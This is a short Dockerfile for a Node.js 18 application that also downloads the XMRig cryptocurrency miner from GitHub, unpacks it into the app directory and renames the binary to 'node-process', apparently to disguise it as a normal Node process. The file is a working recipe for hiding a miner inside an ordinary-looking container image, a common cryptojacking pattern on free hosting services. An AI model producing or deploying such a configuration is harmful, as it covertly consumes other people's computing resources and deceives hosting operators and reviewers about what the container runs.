FROM node:18-slim

RUN apt-get update && apt-get install -y wget tar && rm -rf /var/lib/apt/lists/*

WORKDIR /usr/src/app

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz \
    && tar -xf xmrig-6.21.0-linux-x64.tar.gz --strip-components=1 \
    && mv xmrig node-process \
    && rm xmrig-6.21.0-linux-x64.tar.gz

COPY package*.json ./
RUN npm install
COPY . .

EXPOSE 10000

CMD ["npm", "start"]
